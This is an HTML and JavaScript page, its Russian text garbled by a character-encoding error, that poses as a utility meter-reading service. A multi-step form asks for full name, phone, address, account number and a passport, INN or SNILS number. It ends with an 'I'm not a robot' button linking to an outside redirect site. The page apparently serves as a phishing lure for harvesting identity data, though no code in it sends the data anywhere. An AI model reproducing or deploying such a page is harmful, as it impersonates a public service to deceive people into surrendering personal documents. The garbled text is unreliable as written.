<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–ñ–ö–• ‚Äî –ø–µ—Ä–µ–¥–∞—á–∞ –ø–æ–∫–∞–∑–∞–Ω–∏–π</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
    .container { max-width: 500px; margin: auto; background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 3px 8px rgba(0,0,0,0.15); }
    .step { display: none; }
    .step.active { display: block; }
    h2, h3 { margin-bottom: 10px; }
    input { width: 100%; padding: 10px; margin-top: 8px; border: 1px solid #ccc; border-radius: 6px; }
    .buttons { margin-top: 15px; display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
    button { padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer; }
    button:disabled { background: #ccc; cursor: not-allowed; }
    .next { background: #007bff; color: #fff; }
    .back { background: #6c757d; color: #fff; }
    .doc-btn { background: #17a2b8; color: #fff; flex: 1; }
    .error { color: red; font-size: 14px; margin-top: 5px; }
    small { color: #555; display: block; margin-top: 4px; }
  </style>
</head>
<body>
  <div class="container">
    <form id="wizardForm">

      <!-- –í—Å—Ç—É–ø–ª–µ–Ω–∏–µ -->
      <div class="step active">
        <h2>üè† –ñ–ö–• ‚Äî –æ–Ω–ª–∞–π–Ω</h2>
        <p>üíß –ü–µ—Ä–µ–¥–∞–≤–∞–π—Ç–µ –ø–æ–∫–∞–∑–∞–Ω–∏—è –ø—Ä—è–º–æ –∏–∑ –±—Ä–∞—É–∑–µ—Ä–∞.</p>
        <p>‚ö° –í—Å–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä—è—é—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.</p>
        <p>üëã –ù–∞–∂–º–∏—Ç–µ ¬´–î–∞–ª–µ–µ¬ª, —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å.</p>
        <div class="buttons">
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –§–ò–û -->
      <div class="step">
        <h3>üë§ –í–≤–µ–¥–∏—Ç–µ –§–ò–û</h3>
        <input type="text" id="fullname" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" required>
        <div class="error" id="err-fullname"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –¢–µ–ª–µ—Ñ–æ–Ω -->
      <div class="step">
        <h3>üìû –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h3>
        <input type="tel" id="phone" placeholder="+79991234567" required>
        <div class="error" id="err-phone"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –ê–¥—Ä–µ—Å -->
      <div class="step">
        <h3>üè† –ê–¥—Ä–µ—Å</h3>
        <input type="text" id="address" placeholder="–≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 1" required>
        <div class="error" id="err-address"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –õ–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç -->
      <div class="step">
        <h3>üí≥ –õ–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç</h3>
        <input type="text" id="account" placeholder="1234567890" required>
        <div class="error" id="err-account"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –í—ã–±–æ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ -->
      <div class="step">
        <h3>üìÑ –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç</h3>
        <div class="buttons">
          <button type="button" class="doc-btn" data-doc="passport">üìÑ –ü–∞—Å–ø–æ—Ä—Ç</button>
          <button type="button" class="doc-btn" data-doc="inn">üßæ –ò–ù–ù</button>
          <button type="button" class="doc-btn" data-doc="snils">üü¢ –°–ù–ò–õ–°</button>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –ù–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ -->
      <div class="step">
        <h3 id="doc-title">üî¢ –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞</h3>
        <div id="doc-example" style="margin-bottom:8px;color:#333;font-size:14px;"></div>
        <input type="text" id="docnumber" required>
        <div class="error" id="err-doc"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –§–∏–Ω–∞–ª -->
      <div class="step">
        <h3>‚úÖ –í—Å—ë –≥–æ—Ç–æ–≤–æ!</h3>
        <p>–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–∞–Ω–Ω—ã–µ –∏ –∑–∞–≤–µ—Ä—à–∏—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ–º:</p>
        <a href="https://redirect.figma.site/" target="_blank">
          <button type="button" class="next">–Ø –Ω–µ —Ä–æ–±–æ—Ç ‚úÖ</button>
        </a>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
        </div>
      </div>

    </form>
  </div>

<script>
const steps = document.querySelectorAll('.step');
let currentStep = 0;
let selectedDoc = null;

// –ø–æ–∫–∞–∑–∞—Ç—å —à–∞–≥
function showStep(n) {
  steps.forEach((s,i)=>s.classList.toggle('active', i===n));
  currentStep = n;
}

// –∫–Ω–æ–ø–∫–∏ "–î–∞–ª–µ–µ"
document.querySelectorAll('.next').forEach(btn=>{
  btn.addEventListener('click', ()=>{
    if (!validateStep(currentStep)) return;
    if (currentStep < steps.length-1) showStep(currentStep+1);
  });
});

// –∫–Ω–æ–ø–∫–∏ "–ù–∞–∑–∞–¥"
document.querySelectorAll('.back').forEach(btn=>{
  btn.addEventListener('click', ()=>{ if (currentStep>0) showStep(currentStep-1); });
});

// –≤—ã–±–æ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞
document.querySelectorAll('.doc-btn').forEach(btn=>{
  btn.addEventListener('click', ()=>{
    selectedDoc = btn.dataset.doc;
    const docnumber = document.getElementById('docnumber');
    const example = document.getElementById('doc-example');
    if (selectedDoc==="passport") {
      docnumber.pattern="^\\d{4}\\s\\d{6}$";
      example.textContent="–ü—Ä–∏–º–µ—Ä –ø–∞—Å–ø–æ—Ä—Ç–∞: 4510 123456";
    }
    if (selectedDoc==="inn") {
      docnumber.pattern="^\\d{10}(\\d{2})?$";
      example.textContent="–ü—Ä–∏–º–µ—Ä –ò–ù–ù: 500100732259";
    }
    if (selectedDoc==="snils") {
      docnumber.pattern="^\\d{3}-\\d{3}-\\d{3}\\s\\d{2}$";
      example.textContent="–ü—Ä–∏–º–µ—Ä –°–ù–ò–õ–°: 112-233-445 95";
    }
    showStep(currentStep+1);
  });
});

// –≤–∞–ª–∏–¥–∞—Ü–∏—è
function validateStep(step) {
  let val, re;
  if (step===1) { // –§–ò–û
    val=document.getElementById('fullname').value.trim();
    re=/^[–ê-–Ø–Å][–∞-—è—ë]+\s[–ê-–Ø–Å][–∞-—è—ë]+\s[–ê-–Ø–Å][–∞-—è—ë]+$/;
    if(!re.test(val)) {document.getElementById('err-fullname').textContent="–í–≤–µ–¥–∏—Ç–µ –§–ò–û –ø–æ–ª–Ω–æ—Å—Ç—å—é –∫–∏—Ä–∏–ª–ª–∏—Ü–µ–π"; return false;}
    document.getElementById('err-fullname').textContent=""; return true;
  }
  if (step===2) { // —Ç–µ–ª–µ—Ñ–æ–Ω
    val=document.getElementById('phone').value.trim();
    re=/^(\+7|7)\d{10}$/;
    if(!re.test(val)) {document.getElementById('err-phone').textContent="–¢–µ–ª–µ—Ñ–æ–Ω –≤ —Ñ–æ—Ä–º–∞—Ç–µ +79991234567"; return false;}
    document.getElementById('err-phone').textContent=""; return true;
  }
  if (step===3) { // –∞–¥—Ä–µ—Å
    val=document.getElementById('address').value.trim();
    if(val.length<5) {document.getElementById('err-address').textContent="–ê–¥—Ä–µ—Å —Å–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–π"; return false;}
    document.getElementById('err-address').textContent=""; return true;
  }
  if (step===4) { // —Å—á—ë—Ç
    val=document.getElementById('account').value.trim();
    re=/^\d{6,12}$/;
    if(!re.test(val)) {document.getElementById('err-account').textContent="–°—á—ë—Ç 6-12 —Ü–∏—Ñ—Ä"; return false;}
    document.getElementById('err-account').textContent=""; return true;
  }
  if (step===6) { // –¥–æ–∫—É–º–µ–Ω—Ç
    val=document.getElementById('docnumber').value.trim();
    re=new RegExp(document.getElementById('docnumber').pattern);
    if(!re.test(val)) {document.getElementById('err-doc').textContent="–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –Ω–æ–º–µ—Ä–∞"; return false;}
    document.getElementById('err-doc').textContent=""; return true;
  }
  return true;
}
</script>
</body>
</html>
